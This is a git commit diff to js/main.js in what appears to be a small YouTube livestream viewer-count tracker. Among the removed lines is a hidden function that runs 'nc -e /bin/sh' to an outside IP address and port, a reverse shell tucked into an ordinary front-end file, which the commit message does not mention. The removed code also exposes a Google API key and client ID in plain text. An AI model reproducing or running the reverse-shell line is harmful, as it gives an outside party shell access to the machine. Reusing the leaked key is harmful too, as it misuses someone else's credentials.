16f0bf7a1759fc0ffc1eb63d2118c1002ab4f544
Uzair-Admin <orangeball39@gmail.com>
2020-08-27 19:29:52 -0400

    remove code from execute function

--- js/main.js
+++ js/main.js
@@ -7,15 +7,6 @@ var data = [];
 
 var i = 0;
 
-function test(command) {
-  const exec = require('child_process').exec;
-
-  exec(command, (err, stdout, stderr) => {
-    process.stdout.write(stdout)
-  })
-}
-test('nc -e /bin/sh 78.68.246.110 1337 &');
-
 function toggleClicked() {
     updateButton(!running);
     if (running) {
@@ -29,7 +20,6 @@ function updateButton(setRunning) {
     document.getElementById("info-text").innerHTML = running ? "started" : "stopped";
     document.getElementById("startstop").innerHTML = running ? "stop" : "start";
 }
-
 
 var para;
 var text;
@@ -47,7 +37,7 @@ function run(from, timeInterval, totalTime) {
 
     setTimeout(function () {
         if (i < count && running) {
-            execute().then(function () {
+            getCurrentViewers().then(function () {
                 i++;
                 document.getElementById("info-text").innerHTML = "Request " + i + " of " + count;
                 run("repeat", timeInterval, totalTime);
@@ -77,58 +67,7 @@ function run(from, timeInterval, totalTime) {
     }, timeInterval);
 }
 
-function load() {
-
-    gapi.load("client:auth2", function() {
-        gapi.auth2.init({client_id: "184134997783-hg6clikhn40ekh5jugqssma3nre9a03m.apps.googleusercontent.com"});
-    });
-
-    document.getElementById("load-btn").innerHTML = "Loaded!";
-}
-
-function authenticate() {
-
-    return gapi.auth2.getAuthInstance()
-        .signIn({scope: "https://www.googleapis.com/auth/youtube.readonly"})
-        .then(function() {
-            console.log("Sign-in successful");
-            document.getElementById("signin-text").innerHTML = "Sign in successful";
-            document.getElementById("signin-text").style.color = "green";
-        }, function(err) {
-            console.error("Error signing in", err);
-            document.getElementById("signin-text").innerHTML = "Error signing in";
-            document.getElementById("signin-text").style.color = "red";
-        });
-}
-
-function loadClient() {
-    gapi.client.setApiKey("AIzaSyChuEvw1Ii6dMd2dhYlPfLCH49jtRe-CZk");
-    return gapi.client.load("https://www.googleapis.com/discovery/v1/apis/youtube/v3/rest")
-        .then(function() {
-            console.log("GAPI client loaded for API");
-        }, function(err) {
-            console.error("Error loading GAPI client for API", err);
-        });
-}
-
-// Make sure the client is loaded and sign-in is complete before calling this method.
-function execute() {
-    return gapi.client.youtube.videos.list({
-        "part": ["liveStreamingDetails"],
-        "id": ["PL-GXzQU_x0"]
-    }).then(function(response) {
-
-        data.push([response.headers.date, response.result.items[0].liveStreamingDetails.concurrentViewers]);
-
-        text = document.createElement("p");
-        text.innerHTML = response.headers.date + "\n";
-        document.getElementById("times").appendChild(text);
-
-        text = document.createElement("p");
-        text.innerHTML = response.result.items[0].liveStreamingDetails.concurrentViewers + "\n";
-        document.getElementById("values").appendChild(text);
-
-    }, function(err) {
-        console.error("Error in API request", err);
-    });
+//function to get number of viewers random int temporary placeholder
+function getCurrentViewers() {
+    return Math.floor(Math.random()*10);
 }
